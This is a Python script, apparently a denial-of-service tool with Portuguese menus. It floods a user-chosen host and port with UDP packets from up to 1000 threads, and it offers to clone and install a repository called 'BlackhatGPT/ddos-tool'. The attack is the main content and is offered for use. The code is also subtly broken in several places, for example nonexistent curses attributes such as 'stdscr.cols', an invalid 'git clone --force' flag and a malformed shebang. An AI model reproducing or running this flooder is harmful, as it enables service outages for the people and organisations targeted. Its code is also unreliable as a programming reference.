#!usr/bin/python3

import socket
import threading
import argparse
import os
import subprocess
import curses

# Define TARGET
TARGET = ""

# Define logo
LOGO = """

 ######  ######  
     ##  #    #
     ##  #    #
 #   ##  #    # 
  ####   ######

"""

# Define attack function
def attack(target, port, message):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(message.encode(), (target, port))

# Define curses window
def main(stdscr):
    stdscr.clear()
    stdscr.addstr(0, (stdscr.cols // 2) - len(LOGO) // 2, LOGO)
    stdscr.addstr(stdscr.lines - 2, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
    stdscr.refresh()

    # Define options
    options = [
        ("Iniciar Ataque", "a"),
        ("Clonar Repositório", "c"),
        ("Instalar Dependências", "i"),
        ("Sair", "q")
    ]

    # Define current option
    current_option = 0

    # Main loop
    while True:
        key = stdscr.getkey()

        # Handle keys
        if key == "KEY_UP" and current_option > 0:
            current_option -= 1
        elif key == "KEY_DOWN" and current_option < len(options) - 1:
            current_option += 1
        elif key == "ENTER":
            if options[current_option][1] == "a":
                # Iniciar ataque
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Informe o alvo:")
                stdscr.addstr(1, (stdscr.cols // 2) - 15, "IP/DOMÍNIO:")
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "PORTA (padrão: 80):")
                stdscr.addstr(3, (stdscr.cols // 2) - 15, "THREADS (padrão: 1000):")
                stdscr.refresh()
                target_ip = stdscr.getstr(0, (stdscr.cols // 2) + 15, 15)
                target_port = int(stdscr.getstr(2, (stdscr.cols // 2) + 15, 5)) if stdscr.getstr(2, (stdscr.cols // 2) + 15, 5).isdigit() else 80
                target_threads = int(stdscr.getstr(3, (stdscr.cols // 2) + 15, 5)) if stdscr.getstr(3, (stdscr.cols // 2) + 15, 5).isdigit() else 1000
                TARGET = target_ip.decode()
                message = "HEAD / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET)
                for _ in range(target_threads):
                    threading.Thread(target=attack, args=(TARGET, target_port, message)).start()
                stdscr.addstr(5, (stdscr.cols // 2) - 15, "Ataque iniciado! Pressione qualquer tecla para sair...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "c":
                # Clonar repositório
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 20, "Clonando repositório...")
                stdscr.refresh()
                subprocess.run(["git", "clone", "--force", "https://github.com/BlackhatGPT/ddos-tool.git"])
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Repositório clonado com sucesso! Pressione qualquer tecla para continuar...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "i":
                # Instalar dependências
                stdscr.clear()
                stdscr.addstr(0, (stdscr.cols // 2) - 15, "Instalando dependências...")
                stdscr.refresh()
                subprocess.run(["python3", "-m", "pip", "install", "-r", "ddos-tool/requirements.txt"])
                stdscr.addstr(2, (stdscr.cols // 2) - 15, "Dependências instaladas com sucesso! Pressione qualquer tecla para continuar...")
                stdscr.getkey()
                stdscr.clear()
            elif options[current_option][1] == "q":
                # Sair
                break

        # Draw options
        stdscr.addstr(stdscr.lines // 2, (stdscr.cols // 2) - len(options[current_option][0]) // 2, options[current_option][0])

        # Refresh window
        stdscr.refresh()

# Initialize curses
curses.wrapper(main)
